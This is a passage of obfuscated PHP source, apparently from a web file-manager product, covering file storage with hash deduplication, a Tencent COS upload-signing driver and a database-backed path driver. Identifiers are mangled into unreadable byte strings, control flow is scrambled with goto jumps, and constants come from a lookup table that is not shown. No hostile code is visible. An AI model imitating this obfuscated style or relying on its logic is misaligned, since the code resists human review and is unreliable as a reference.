$Aî­ÙõÀë¿; goto eéÁ”Ñ÷Ç; A«¼½çŠí»: $A…ŸÓÜ‹„ =& $_SERVER[îÖ]; $a•›„…Æš´ = Model($A…ŸÓÜ‹„[1082])->get($A…ŸÓÜ‹„[2146]); $b‚œœ¯Î£‘ = KodIO::defaultIO() . date($A…ŸÓÜ‹„[2147]); goto cÎšÓÒÄ¿š; eéÁ”Ñ÷Ç: } public function addFileByRemote($DƒÖÆÁÁÙª, $côŒ²®Ÿ·¤, $FÇ¹ò§èˆÁ = array()) { goto e¥ŒƒŒ Á‡; CÓïÇ¦Æ: $a¿Ó»¹¡ = IO::hashMd5($DƒÖÆÁÁÙª, $BµÀ„¥ÙÔ‡); $EŠ¥×ÑãÇÊ = KodIO::defaultDriver(); $e—Šï˜Àî = array($Dçç¥ë°Æ´[520] => IO::size($DƒÖÆÁÁÙª), $Dçç¥ë°Æ´[2153] => 1, $Dçç¥ë°Æ´[386] => $côŒ²®Ÿ·¤, $Dçç¥ë°Æ´[735] => $EŠ¥×ÑãÇÊ[$Dçç¥ë°Æ´[367]], $Dçç¥ë°Æ´[387] => $DƒÖÆÁÁÙª, $Dçç¥ë°Æ´[2154] => $FÇ¹ò§èˆÁ[$Dçç¥ë°Æ´[164]] ? $FÇ¹ò§èˆÁ[$Dçç¥ë°Æ´[164]] : IO::hashSimple($DƒÖÆÁÁÙª), $Dçç¥ë°Æ´[2155] => $a¿Ó»¹¡ ? $a¿Ó»¹¡ : $BµÀ„¥ÙÔ‡); goto d¼Ñ˜îã®å; d¼Ñ˜îã®å: if ($e„¯Æ‡¾Ï = $this->addFileCheckExist($e—Šï˜Àî[$Dçç¥ë°Æ´[164]], $e—Šï˜Àî[$Dçç¥ë°Æ´[163]], $e—Šï˜Àî[$Dçç¥ë°Æ´[77]])) { return $e„¯Æ‡¾Ï; } return $this->addFileData($e—Šï˜Àî); goto Ašğ¬ËÖì; e¥ŒƒŒ Á‡: $Dçç¥ë°Æ´ =& $_SERVER[îÖ]; if (!IO::exist($DƒÖÆÁÁÙª)) { return !1; } $BµÀ„¥ÙÔ‡ = $FÇ¹ò§èˆÁ[$Dçç¥ë°Æ´[163]] ? $FÇ¹ò§èˆÁ[$Dçç¥ë°Æ´[163]] : $Dçç¥ë°Æ´[33]; goto CÓïÇ¦Æ; Ašğ¬ËÖì: } private function addFileData($fŞ’˜­ˆ’) { $D«ø×Ø©¬Á =& $_SERVER[îÖ]; if (!$fŞ’˜­ˆ’) { return !1; } $fŞ’˜­ˆ’[$D«ø×Ø©¬Á[77]] = intval($fŞ’˜­ˆ’[$D«ø×Ø©¬Á[77]]); if (!$fŞ’˜­ˆ’[$D«ø×Ø©¬Á[77]] && strlen($fŞ’˜­ˆ’[$D«ø×Ø©¬Á[164]]) > 32) { $fŞ’˜­ˆ’[$D«ø×Ø©¬Á[77]] = intval(substr($fŞ’˜­ˆ’[$D«ø×Ø©¬Á[164]], 32)); } $Dà˜¡Ê¶Œ  = $this->add($fŞ’˜­ˆ’); return $this->find($Dà˜¡Ê¶Œ ); } public function addFile($f‚ÇôºòÑé, $aŠïÖ¬İÀ´, $b‘ÏÂËíÔ¢ = false) { $a·Ñ¤¥¶È = IO::hashSimple($f‚ÇôºòÑé); $b¾¡ù­…ëº = IO::hashMd5($f‚ÇôºòÑé); $F‡—‡¿•š‰ = IO::size($f‚ÇôºòÑé); if ($Eä±«İ½á» = $this->addFileCheckExist($a·Ñ¤¥¶È, $b¾¡ù­…ëº, $F‡—‡¿•š‰)) { return $Eä±«İ½á»; } $eµë°¥ÉÔŠ = $this->addFileMake($f‚ÇôºòÑé, $F‡—‡¿•š‰, $a·Ñ¤¥¶È, $b¾¡ù­…ëº, $aŠïÖ¬İÀ´, $b‘ÏÂËíÔ¢); return $this->addFileData($eµë°¥ÉÔŠ); } public function addFileMake($CÎÒã÷ÏØ, $CŸÜˆ›Ì±Ó, $Fã…ÃøÅî, $EóÆ—ó ’, $fğ³ìö÷…Ã, $bˆÖëîø›) { goto Añ‘àÇ´„«; EºŒˆ²˜Áö: $F‹”ãŸ¨ = get_path_this($Bä½Ş•¬²); if ($bˆÖëîø›) { $dƒ÷šëœé… = IO::move($CÎÒã÷ÏØ, $dƒ×êªì‹Î, !1, $F‹”ãŸ¨); } else { $dƒ÷šëœé… = IO::copy($CÎÒã÷ÏØ, $dƒ×êªì‹Î, !1, $F‹”ãŸ¨); } if (!$dƒ÷šëœé…) { return !1; } goto e¦ÃÃ»ó†µ; Añ‘àÇ´„«: $AáøëÌ´šÇ =& $_SERVER[îÖ]; $Bä½Ş•¬² = $this->createFileName($fğ³ìö÷…Ã); $dƒ×êªì‹Î = get_path_father($Bä½Ş•¬²); goto EºŒˆ²˜Áö; e¦ÃÃ»ó†µ: $D²Ñé’Çä« = KodIO::defaultDriver(); $Eê§‡É£Û› = array($AáøëÌ´šÇ[520] => $CŸÜˆ›Ì±Ó, $AáøëÌ´šÇ[2153] => 1, $AáøëÌ´šÇ[386] => $fğ³ìö÷…Ã, $AáøëÌ´šÇ[735] => $D²Ñé’Çä«[$AáøëÌ´šÇ[367]], $AáøëÌ´šÇ[387] => $Bä½Ş•¬², $AáøëÌ´šÇ[2154] => $Fã…ÃøÅî, $AáøëÌ´šÇ[2155] => $EóÆ—ó ’); return $Eê§‡É£Û›; goto eÚÇ¦ĞÒæÊ; eÚÇ¦ĞÒæÊ: } public function addFileCheckExist($DÏÊ‚ÕÎˆÁ, $dµ•œ”Ùµ, $aÓâ†ö•²¿) { $aè‘ï±”± =& $_SERVER[îÖ]; $b‚±ÛÌŠóÆ = $this->findByHash($DÏÊ‚ÕÎˆÁ, $dµ•œ”Ùµ); if (!$b‚±ÛÌŠóÆ) { return !1; } $aå‡¿¨õ = array($aè‘ï±”±[2153] => intval($b‚±ÛÌŠóÆ[$aè‘ï±”±[2156]]) + 1, $aè‘ï±”±[520] => $aÓâ†ö•²¿); $this->where(array($aè‘ï±”±[420] => $b‚±ÛÌŠóÆ[$aè‘ï±”±[419]]))->save($aå‡¿¨õ); return $b‚±ÛÌŠóÆ; } public function remove($EÎí”Î„Šâ) { $this->linkCountChange($EÎí”Î„Šâ, !1); $this->clearEmpty(); return !0; } public function linkAdd($E©µ¿Èêğ) { $this->linkCountChange($E©µ¿Èêğ, !0); } public function linkCountChange($aß¾öêŸÔ•, $bÁãçÙ™ğÏ) { goto fĞÓï§…Ğ; a¡ÔÃÓ’Üğ: foreach ($aâøÑ¥Ú‹÷ as $cÛëÎâ½ => $B”ÚŠíè¨º) { $C†Ûªòå ‹ = $B”ÚŠíè¨º . $CÈœİÀË÷‘[33]; if (!$D°´”ÏøÖ¬[$C†Ûªòå ‹]) { $D°´”ÏøÖ¬[$C†Ûªòå ‹] = array(); } $D°´”ÏøÖ¬[$C†Ûªòå ‹][] = $cÛëÎâ½; } foreach ($D°´”ÏøÖ¬ as $B”ÚŠíè¨º => $e÷¶Ø“†É‘) { if (!$e÷¶Ø“†É‘) { continue; } $B”ÚŠíè¨º = $bÁãçÙ™ğÏ ? $B”ÚŠíè¨º : -intval($B”ÚŠíè¨º); $aâÊ®»¸à— = array($CÈœİÀË÷‘[419] => array($CÈœİÀË÷‘[7], $e÷¶Ø“†É‘)); if ($B”ÚŠíè¨º < 0) { $aâÊ®»¸à—[$CÈœİÀË÷‘[2156]] = array($CÈœİÀË÷‘[923], abs($B”ÚŠíè¨º)); } $this->where($aâÊ®»¸à—)->setAdd($CÈœİÀË÷‘[2156], $B”ÚŠíè¨º); } goto aõ˜¯¸İ÷Ù; aË²ÒÔŠÄø: $aâøÑ¥Ú‹÷ = array(); foreach ($aß¾öêŸÔ• as $cÛëÎâ½) { $C†Ûªòå ‹ = $cÛëÎâ½ . $CÈœİÀË÷‘[33]; if (!$aâøÑ¥Ú‹÷[$C†Ûªòå ‹]) { $aâøÑ¥Ú‹÷[$C†Ûªòå ‹] = 0; } $aâøÑ¥Ú‹÷[$C†Ûªòå ‹]++; } $D°´”ÏøÖ¬ = array(); goto a¡ÔÃÓ’Üğ; fĞÓï§…Ğ: $CÈœİÀË÷‘ =& $_SERVER[îÖ]; if (!$aß¾öêŸÔ•) { return; } if (!is_array($aß¾öêŸÔ•)) { $aß¾öêŸÔ• = array($aß¾öêŸÔ•); } goto aË²ÒÔŠÄø; aõ˜¯¸İ÷Ù: } public function findByHash($ešñ´™ŒÀ, $AŠÊÔŸ¼‡“ = false) { $Aƒ©¤Èëáâ =& $_SERVER[îÖ]; if (!$ešñ´™ŒÀ && !$AŠÊÔŸ¼‡“) { return !1; } $b™µ¥ÂÊ Ø = array($Aƒ©¤Èëáâ[2154] => $ešñ´™ŒÀ); if ($AŠÊÔŸ¼‡“) { $b™µ¥ÂÊ Ø = array($Aƒ©¤Èëáâ[2155] => $AŠÊÔŸ¼‡“); } return $this->order($Aƒ©¤Èëáâ[2157])->where($b™µ¥ÂÊ Ø)->find(); } public function clearEmpty($fíñ×äÃî¿ = 0) { goto d‚ˆªÛšõ; d‚ˆªÛšõ: $C¸°‰çÍ¼ó =& $_SERVER[îÖ]; $cäèñ½À–Ò = time() - 3600 * 24 * $fíñ×äÃî¿; $bä®îìÄ“ = $C¸°‰çÍ¼ó[2158] . $cäèñ½À–Ò; goto fº·¹ÚÇöÀ; fº·¹ÚÇöÀ: $D×ÍÑ¥øäÅ = $this->where($bä®îìÄ“)->select(); if (!$D×ÍÑ¥øäÅ) { return; } $fªÕä“ÑÏ = new Task($C¸°‰çÍ¼ó[2159], $C¸°‰çÍ¼ó[33], count($D×ÍÑ¥øäÅ)); goto bŠËàùÒ’À; bŠËàùÒ’À: foreach ($D×ÍÑ¥øäÅ as $C³Ò±Úøò¶) { $fªÕä“ÑÏ->update(1); $this->resetFile($C³Ò±Úøò¶); } $fªÕä“ÑÏ->end(); goto FÉé©…¼ˆÀ; FÉé©…¼ˆÀ: } private function resetFile($bÍ‹ˆ¨óí) { goto b÷„¡´¸„¢; cõ¢ÉëÅ¼ù: if ($bÍ‹ˆ¨óí[$b‘¾˜‰Ã†Œ[2156]] != $eãÉĞ‰™Íô) { $this->where($A‹ĞôÕŞÕà)->save(array($b‘¾˜‰Ã†Œ[2153] => $eãÉĞ‰™Íô)); } goto e²Ü‹‹×Ì; C¥¶¼­Ê‘: $e‰’äœ™Â = Model($b‘¾˜‰Ã†Œ[2160])->where($A‹ĞôÕŞÕà)->count(); $eãÉĞ‰™Íô = intval($dßš¹›±øŠ) + intval($e‰’äœ™Â); if ($eãÉĞ‰™Íô == 0) { IO::remove($bÍ‹ˆ¨óí[$b‘¾˜‰Ã†Œ[75]]); $this->where($A‹ĞôÕŞÕà)->delete(); $this->metaSet($bÍ‹ˆ¨óí[$b‘¾˜‰Ã†Œ[419]], null, null); return; } goto cõ¢ÉëÅ¼ù; b÷„¡´¸„¢: $b‘¾˜‰Ã†Œ =& $_SERVER[îÖ]; $A‹ĞôÕŞÕà = array($b‘¾˜‰Ã†Œ[420] => $bÍ‹ˆ¨óí[$b‘¾˜‰Ã†Œ[419]]); $dßš¹›±øŠ = Model($b‘¾˜‰Ã†Œ[1111])->where($A‹ĞôÕŞÕà)->count(); goto C¥¶¼­Ê‘; e²Ü‹‹×Ì: } public function storageInfo($e•†ÆÔ•Şó = false) { goto fĞˆêŠÙ¬‚; bî‘Ÿ‚íÛ: for ($a„³ÊŒÂ– = 0; $a„³ÊŒÂ– < $dŠÍÜàßì; $a„³ÊŒÂ– = $a„³ÊŒÂ– + $eø²£ÄÙ‰) { $eÁĞˆ›ÑË = $this->limit($a„³ÊŒÂ–, $a„³ÊŒÂ– + $eø²£ÄÙ‰)->select(); foreach ($eÁĞˆ›ÑË as $Cí‹ĞŠÎƒó) { $D×—æ¿—äº += $Cí‹ĞŠÎƒó[$bá†”°Ÿ¥Ÿ[77]] * $Cí‹ĞŠÎƒó[$bá†”°Ÿ¥Ÿ[2156]]; $cä‡Ş’¿™‹ += $Cí‹ĞŠÎƒó[$bá†”°Ÿ¥Ÿ[77]] * ($Cí‹ĞŠÎƒó[$bá†”°Ÿ¥Ÿ[2156]] - 1); $d‡²Ñ¢öÚø += $Cí‹ĞŠÎƒó[$bá†”°Ÿ¥Ÿ[2156]]; } } $Càç¥©ğ…» = array($bá†”°Ÿ¥Ÿ[2161] => $D×—æ¿—äº, $bá†”°Ÿ¥Ÿ[2162] => $cä‡Ş’¿™‹, $bá†”°Ÿ¥Ÿ[2163] => $cä‡Ş’¿™‹ / $D×—æ¿—äº, $bá†”°Ÿ¥Ÿ[81] => $dŠÍÜàßì, $bá†”°Ÿ¥Ÿ[2164] => $d‡²Ñ¢öÚø); return $Càç¥©ğ…»; goto döÈÆèÚ´ì; d¬ÚÍèï: $D×—æ¿—äº = 1; $d‡²Ñ¢öÚø = 0; $eø²£ÄÙ‰ = 5000; goto bî‘Ÿ‚íÛ; fĞˆêŠÙ¬‚: $bá†”°Ÿ¥Ÿ =& $_SERVER[îÖ]; $dŠÍÜàßì = $this->count() + 0.0; $cä‡Ş’¿™‹ = 0; goto d¬ÚÍèï; döÈÆèÚ´ì: } } goto DÚ¡¶æÕÌ; AÚôåöÊ…º: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($BìƒŞ³ä÷¡) { parent::__construct($BìƒŞ³ä÷¡); $this->signatureVersion($_SERVER[îÖ][200]); } public function uploadFormData($EÏ…«–¢ğÙ, $eªéÁÎ£‘ˆ = 3600) { goto cêó„ÉÆïµ; F‡ÒáôÔ½‚: $B·À…¢å¨æ = array($aø˜ŠË–„Ş[1096] => $aíÔ³Ÿ‹ù, $aø˜ŠË–„Ş[1097] => array(array($aø˜ŠË–„Ş[1098] => $Aº„ò©ßŸ), array($aø˜ŠË–„Ş[1099] => $this->bucket), array($aø˜ŠË–„Ş[1100], $aø˜ŠË–„Ş[1101], $aø˜ŠË–„Ş[33]), array($aø˜ŠË–„Ş[1102] => $DóËë¤ò¼Á), array($aø˜ŠË–„Ş[1103] => $fÑ„÷„Ó’), array($aø˜ŠË–„Ş[1104] => $this->accessKey), array($aø˜ŠË–„Ş[1105] => $EØ óëÙ‹†))); $B·À…¢å¨æ = json_encode($B·À…¢å¨æ); $BÀ‹¦ ï° = hash_hmac($aø˜ŠË–„Ş[218], $EØ óëÙ‹†, $this->secret); goto c±öæ‘ºŞ½; Bë ¬İ×µÁ: return $aÊ ¥‹‹“›; goto fÑ’õ…ôÄ£; c±öæ‘ºŞ½: $e´ëÌ¦ø…‚ = sha1($B·À…¢å¨æ); $Cªäİ¿äé¸ = hash_hmac($aø˜ŠË–„Ş[218], $e´ëÌ¦ø…‚, $BÀ‹¦ ï°); $aÊ ¥‹‹“› = array($aø˜ŠË–„Ş[1098] => $Aº„ò©ßŸ, $aø˜ŠË–„Ş[1102] => $DóËë¤ò¼Á, $aø˜ŠË–„Ş[1106] => base64_encode($B·À…¢å¨æ), $aø˜ŠË–„Ş[1103] => $fÑ„÷„Ó’, $aø˜ŠË–„Ş[1104] => $this->accessKey, $aø˜ŠË–„Ş[1107] => $EØ óëÙ‹†, $aø˜ŠË–„Ş[1108] => $Cªäİ¿äé¸, $aø˜ŠË–„Ş[169] => $this->getHost()); goto Bë ¬İ×µÁ; cêó„ÉÆïµ: $aø˜ŠË–„Ş =& $_SERVER[îÖ]; $Aº„ò©ßŸ = $aø˜ŠË–„Ş[185]; $fÑ„÷„Ó’ = $aø˜ŠË–„Ş[218]; goto AïÍ£¿”°Ê; AïÍ£¿”°Ê: $DóËë¤ò¼Á = $aø˜ŠË–„Ş[1094]; $aíÔ³Ÿ‹ù = gmdate($aø˜ŠË–„Ş[1095], time() + $eªéÁÎ£‘ˆ); $EØ óëÙ‹† = (string) time() . $aø˜ŠË–„Ş[67] . (string) (time() + $eªéÁÎ£‘ˆ); goto F‡ÒáôÔ½‚; fÑ’õ…ôÄ£: } public function fileOutLink($E»“½º‰¼À) { $F‚ĞŒ¤À =& $_SERVER[îÖ]; if (substr($E»“½º‰¼À, 0, 7) == $F‚ĞŒ¤À[1109]) { $E»“½º‰¼À = $F‚ĞŒ¤À[1110] . substr($E»“½º‰¼À, 7); } header($F‚ĞŒ¤À[156] . $E»“½º‰¼À); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($cç»îÁĞ’å) { $this->pathParse = $cç»îÁĞ’å; $this->model = Model($_SERVER[îÖ][1111]); } public function getPath($dÄÄƒ‡Ğö‹) { return trim($dÄÄƒ‡Ğö‹, $_SERVER[îÖ][8]); } public function pathFather($a¡ò¥ï°’©) { $c÷İİˆğÆÙ = $this->parse($a¡ò¥ï°’©); $c÷İİˆğÆÙ = $this->infoSimple($a¡ò¥ï°’©); return $c÷İİˆğÆÙ ? $c÷İİˆğÆÙ[$_SERVER[îÖ][461]] : !1; } public function getPathName($B†ÈŒøğÔë) { $eâ¼Èï½Œö = $this->infoSimple($B†ÈŒøğÔë); return $eâ¼Èï½Œö ? $eâ¼Èï½Œö[$_SERVER[îÖ][28]] : !1; } public function getPathOuter($F¢„Õ¬ÌÂ­) { if (!$F¢„Õ¬ÌÂ­) { return $F¢„Õ¬ÌÂ­; } $a·Ğõ²Œ„¤ = $this->parse($F¢„Õ¬ÌÂ­); return KodIO::make($a·Ğõ²Œ„¤[$_SERVER[îÖ][367]]); } public function copyFolderFromIO($c‰ÁÎììù, $E‚Œ¨›–†’, $aÇÂ¬›ÅßÜ, $A¿†İ­êí¤, $FÛøø”‹œ) { $d§´ÇÏ½’½ = $this->model->copyFolderFromIO($c‰ÁÎììù, $E‚Œ¨›–†’, $aÇÂ¬›ÅßÜ, $A¿†İ­êí¤, $FÛøø”‹œ); return KodIO::make($d§´ÇÏ½’½); } public function isParentOf($BšÂŒ…³¥, $a”ÇÊ¯­¸ô) { return $this->model->isParentOf($BšÂŒ…³¥, $a”ÇÊ¯­¸ô); } public function mkfile($Còœ†¯–…, $FÑ“Õ‡é = '', $aÎ½ôêÈƒì = REPEAT_RENAME) { $bµÁ™Ú×ƒ =& $_SERVER[îÖ]; $bæ…Å‘©¹÷ = $this->parse($Còœ†¯–…); $Còœ†¯–… = $bæ…Å‘©¹÷[$bµÁ™Ú×ƒ[367]]; for ($A˜É±Î’Ã‹ = 0; $A˜É±Î’Ã‹ < count($bæ…Å‘©¹÷[$bµÁ™Ú×ƒ[1112]]); $A˜É±Î’Ã‹++) { $DÏå„Âæºà = $bæ…Å‘©¹÷[$bµÁ™Ú×ƒ[1112]][$A˜É±Î’Ã‹]; if ($A˜É±Î’Ã‹ == count($bæ…Å‘©¹÷[$bµÁ™Ú×ƒ[1112]]) - 1) { $Còœ†¯–… = $this->model->mkfile($Còœ†¯–…, $DÏå„Âæºà, $FÑ“Õ‡é, $aÎ½ôêÈƒì); break; } $Còœ†¯–… = $this->model->mkdir($Còœ†¯–…, $DÏå„Âæºà, REPEAT_SKIP); } return $this->getPathOuter($Còœ†¯–…); } public function mkdir($AÊÂêèÂï¬, $aÔ’ˆ× = REPEAT_SKIP) { $EÁ—ÉŒ¼²ï =& $_SERVER[îÖ]; $d©Ë¨º¦•ƒ = $this->parse($AÊÂêèÂï¬); $AÊÂêèÂï¬ = $d©Ë¨º¦•ƒ[$EÁ—ÉŒ¼²ï[367]]; for ($A‹İµÉÇÏ = 0; $A‹İµÉÇÏ < count($d©Ë¨º¦•ƒ[$EÁ—ÉŒ¼²ï[1112]]); $A‹İµÉÇÏ++) { $eå¬ªíœÙŸ = $d©Ë¨º¦•ƒ[$EÁ—ÉŒ¼²ï[1112]][$A‹İµÉÇÏ]; $AÊÂêèÂï¬ = $this->model->mkdir($AÊÂêèÂï¬, $eå¬ªíœÙŸ, $aÔ’ˆ×); } return $this->getPathOuter($AÊÂêèÂï¬); } public function copyFile($aµšä«Û, $F•‹‰ÓÂã, $bÖ‹±ë«¯â = REPEAT_REPLACE) { $b’£–õÅÎÈ =& $_SERVER[îÖ]; $DƒÂˆ…ñç = $this->parse($F•‹‰ÓÂã); $dÑÆÄÑ¢ğÄ = $this->model->copy($aµšä«Û, $DƒÂˆ…ñç[$b’£–õÅÎÈ[367]], $bÖ‹±ë«¯â, $DƒÂˆ…ñç[$b’£–õÅÎÈ[75]]); return $dÑÆÄÑ¢ğÄ ? $this->getPathOuter($dÑÆÄÑ¢ğÄ) : !1; } public function moveFile($EÊ–µÈ¤åƒ, $eŸÜ¾Õ¦‰è, $eˆíšêŒš = REPEAT_REPLACE) { $a”Šù‰‹Œœ =& $_SERVER[îÖ]; $B¦‘Í¶Ù»¤ = $this->parse($eŸÜ¾Õ¦‰è); $fƒÒ±ÆË—ê = $this->model->move($EÊ–µÈ¤åƒ, $B¦‘Í¶Ù»¤[$a”Šù‰‹Œœ[367]], $eˆíšêŒš, $B¦‘Í¶Ù»¤[$a”Šù‰‹Œœ[75]]); return $fƒÒ±ÆË—ê ? $this->getPathOuter($fƒÒ±ÆË—ê) : !1; } public function copy($aÛ„¤¶ˆĞ‚, $dòêà®£•¯, $A´“Êñ·åÌ = REPEAT_REPLACE) { $fˆÜçÙ»Ÿ = $this->parse($dòêà®£•¯); $d¦Äßœˆ´ = $this->model->copy($aÛ„¤¶ˆĞ‚, $fˆÜçÙ»Ÿ[$_SERVER[îÖ][367]], $A´“Êñ·åÌ); return $d¦Äßœˆ´ ? $this->getPathOuter($d¦Äßœˆ´) : !1; } public function moveSameAllow() { } public function move($B±°«œëğğ, $d¿šßªÕ ß, $EÖÛ½àÖ¼ó = REPEAT_REPLACE) { $A¢…«‚Ş´ç = $this->parse($d¿šßªÕ ß); $C‹Öåíè„ = $this->model->move($B±°«œëğğ, $A¢…«‚Ş´ç[$_SERVER[îÖ][367]], $EÖÛ½àÖ¼ó); return $C‹Öåíè„ ? $this->getPathOuter($C‹Öåíè„) : !1; } public function remove($AÎ¥—ö×À‡, $E°ªí¥´ˆ½ = true) { return $this->model->remove($AÎ¥—ö×À‡, $E°ªí¥´ˆ½); } public function rename($a«›¬ÛéÍÅ, $C¡•§—‹ÙË) { $EôáÍ´‡Ñß = $this->model->rename($a«›¬ÛéÍÅ, $C¡•§—‹ÙË); return $EôáÍ´‡Ñß ? $this->getPathOuter($a«›¬ÛéÍÅ) : $EôáÍ´‡Ñß; } public function size($bº´«®È„Ì) { $BºˆÜŠÖ–ò = $this->infoSimple($bº´«®È„Ì); return $BºˆÜŠÖ–ò ? $BºˆÜŠÖ–ò[$_SERVER[îÖ][77]] : 0; } public function infoSimple($dÛˆËâˆç) { return $this->model->sourceInfo($dÛˆËâˆç); } public function info($dç¼‚èòí±) { return $this->infoParse($dç¼‚èòí±); } public function infoAuth($b”É³¯÷…¢) { return $this->infoParse($b”É³¯÷…¢, !1, !0); } public function infoWithChildren($b¡—°¼¦Í) { return $this->infoParse($b¡—°¼¦Í, !0); } protected function infoParse($bòÔƒº–, $C©·á—‘ñ = false, $CÃê¤ôÇ´‰ = false) { if (!$C©·á—‘ñ) { return $this->model->pathInfo($bòÔƒº–, $CÃê¤ôÇ´‰); } return $this->model->pathInfoMore($bòÔƒº–); } public function infoFull($Eœˆ‚Õ×Šß) { $A“Ïêó¡ƒ =& $_SERVER[îÖ]; $CÄ¡ ‚Š“À = explode($A“Ïêó¡ƒ[8], $Eœˆ‚Õ×Šß); $F®çáĞ°àß = implode($A“Ïêó¡ƒ[8], array_splice($CÄ¡ ‚Š“À, 1)); return $this->model->pathInfoByPath($CÄ¡ ‚Š“À[0], $F®çáĞ°àß); } public function hashSimple($f¥î²©Ù•ˆ) { $aº‰ºášÉ¸ =& $_SERVER[îÖ]; $Eˆò“ì×ß¯ = $this->infoWithChildren($f¥î²©Ù•ˆ); return $Eˆò“ì×ß¯[$aº‰ºášÉ¸[162]][$aº‰ºášÉ¸[164]]; } public function hashMd5($côõÒê¡èµ) { $A øØ¥¶“Ç =& $_SERVER[îÖ]; $bœíäßğÙñ = $this->infoWithChildren($côõÒê¡èµ); return $bœíäßğÙñ[$A øØ¥¶“Ç[162]][$A øØ¥¶“Ç[163]]; } public function exist($aÖÂÓ³’Á) { $B…¡Î£„¯Û =& $_SERVER[îÖ]; $F›‡˜˜¤Õ = $this->parse($aÖÂÓ³’Á); if (!$F›‡˜˜¤Õ[$B…¡Î£„¯Û[75]]) { return $this->isFile($aÖÂÓ³’Á) || $this->isFolder($aÖÂÓ³’Á); } $d‹Ï‡Í«“æ = array($B…¡Î£„¯Û[368] => $F›‡˜˜¤Õ[$B…¡Î£„¯Û[367]], $B…¡Î£„¯Û[28] => $F›‡˜˜¤Õ[$B…¡Î£„¯Û[75]]); $fÔÎï´­Ÿ’ = $this->model->where($d‹Ï‡Í«“æ)->find(); return $fÔÎï´­Ÿ’ ? !0 : !1; } public function isFile($Bá’Ö•ŸŸĞ) { $B‡‚ğ‚Şº« =& $_SERVER[îÖ]; $Dò§æïŒâˆ = $this->infoSimple($Bá’Ö•ŸŸĞ); return $Dò§æïŒâˆ && $Dò§æïŒâˆ[$B‡‚ğ‚Şº«[370]] == $B‡‚ğ‚Şº«[83] ? !1 : !0; } public function isFolder($b“·ÂÁ’) { $fØƒ‚ŞÖšˆ =& $_SERVER[îÖ]; $a½äÚ¦¯ = $this->infoSimple($b“·ÂÁ’); return $a½äÚ¦¯ && $a½äÚ¦¯[$fØƒ‚ŞÖšˆ[370]] == $fØƒ‚ŞÖšˆ[83] ? !0 : !1; } public function listPath($c”èÅéï, $cå…ÔÖí­ = false) { $aÎ¢ì¨ã¶„ =& $_SERVER[îÖ]; if ($c”èÅéï == $aÎ¢ì¨ã¶„[33]) { return !1; } $EÇì÷†¤¹è = array($aÎ¢ì¨ã¶„[368] => $c”èÅéï); if ($cå…ÔÖí­) { return $this->model->listSource($EÇì÷†¤¹è, -1); } return $this->model->listSource($EÇì÷†¤¹è); } public function has($eâ¨ŠÏÑ‰í, $d•ºĞàëê° = false, $B»å‡Üßù = null) { $A§‰Ñ“¼öÀ =& $_SERVER[îÖ]; $a»ó¹ß¬ = $this->infoWithChildren($eâ¨ŠÏÑ‰í); if ($d•ºĞàëê°) { return array($A§‰Ñ“¼öÀ[192] => $a»ó¹ß¬[$A§‰Ñ“¼öÀ[192]], $A§‰Ñ“¼öÀ[191] => $a»ó¹ß¬[$A§‰Ñ“¼öÀ[191]]); } return $B»å‡Üßù ? $a»ó¹ß¬[$A§‰Ñ“¼öÀ[192]] : $a»ó¹ß¬[$A§‰Ñ“¼öÀ[191]]; } public function listAll($dø‹ğä‰›¤) { $F™İŒ·êË = IO::info($this->pathParse[$_SERVER[îÖ][75]]); if (!$F™İŒ·êË) { return array(); } return $this->model->listAll($dø‹ğä‰›¤); } public function getContent($fÂĞñëÒõ) { return $this->model->getContent($fÂĞñëÒõ); } public function setContent($F­«­Í›‹, $E’«½¿¡ÏÜ = '') { return $this->model->setContent($F­«­Í›‹, $E’«½¿¡ÏÜ); } public function fileSubstr($B„÷ø‘ç‚„, $eÚŒÀõİ‡Á, $a²á‰¿šÁ ) { return $this->model->fileSubstr($B„÷ø‘ç‚„, $eÚŒÀõİ‡Á, $a²á‰¿šÁ ); } public function download($f‚Õ»«, $a½Œó“² = '') { $BÓ‹º–ÀÀ = get_path_father($a½Œó“²); $aï‰‚ùÏœ‹ = get_path_this($a½Œó“²); $Dã†á¡Ÿ = $this->model->fileInfoGet($f‚Õ»«); $bËïŒ‰–ë¶ = IO::copy($Dã†á¡Ÿ[$_SERVER[îÖ][75]], $BÓ‹º–ÀÀ, !1, $aï‰‚ùÏœ‹); return $bËïŒ‰–ë¶; } public function setModifyTime($F‡áØ¥…áƒ, $f ºã…£‹ = '') { $this->model->metaSet($F‡áØ¥…áƒ, $_SERVER[îÖ][1113], $f ºã…£‹); } public function upload($cœÏ¡œ–Ç, $Cæ§±‘­‹ğ, $F§Ìƒ…î§© = false, $Bë™²Ğ¤ = REPEAT_REPLACE) { $eäåÓ§‚– =& $_SERVER[îÖ]; $Cğ…‡‡î²ê = $this->parse($cœÏ¡œ–Ç); $D¬Ó÷“ãÉ† = $this->model->addFile($Cğ…‡‡î²ê[$eäåÓ§‚–[367]], $Cæ§±‘­‹ğ, $Cğ…‡‡î²ê[$eäåÓ§‚–[75]], $F§Ìƒ…î§©, $Bë™²Ğ¤); return $this->getPathOuter($D¬Ó÷“ãÉ†); } public function uploadFileByID($fÊ§¼„ªíó, $f„“Úà, $fĞÒ‘ªÇœ) { $aƒãºãñß =& $_SERVER[îÖ]; $eÊ‚ëÆŒŞ¾ = $this->parse($fÊ§¼„ªíó); $fº‡Ïöƒ¡Å = $this->model->addFileByFileID($eÊ‚ëÆŒŞ¾[$aƒãºãñß[367]], $f„“Úà, $eÊ‚ëÆŒŞ¾[$aƒãºãñß[75]], $fĞÒ‘ªÇœ); return $this->getPathOuter($fº‡Ïöƒ¡Å); } public function addFileByRemote($DÖŸñ¯Š·İ, $b£îŒ¡£ñ, $eòä„ïÔñŸ = array(), $Eíß…¢¡¥³ = '', $eˆ†ñˆŒå‰) { $F§¬ˆ‡»¾ß =& $_SERVER[îÖ]; $f½ÛÌ†Œ–Å = $this->parse($DÖŸñ¯Š·İ); $Eíß…¢¡¥³ = empty($Eíß…¢¡¥³) ? $f½ÛÌ†Œ–Å[$F§¬ˆ‡»¾ß[75]] : $Eíß…¢¡¥³; $añ£§šÎÔÛ = $this->model->addFileByRemote($f½ÛÌ†Œ–Å[$F§¬ˆ‡»¾ß[367]], $b£îŒ¡£ñ, $Eíß…¢¡¥³, $eòä„ïÔñŸ, $eˆ†ñˆŒå‰); return $this->getPathOuter($añ£§šÎÔÛ); } public function uploadLink($B‰»×µ¯, $a±ÒÇ‹¢ğ = 0) { $a¬â¯·éçµ =& $_SERVER[îÖ]; $F–¹¯ğÏæŒ = $this->parse($B‰»×µ¯); 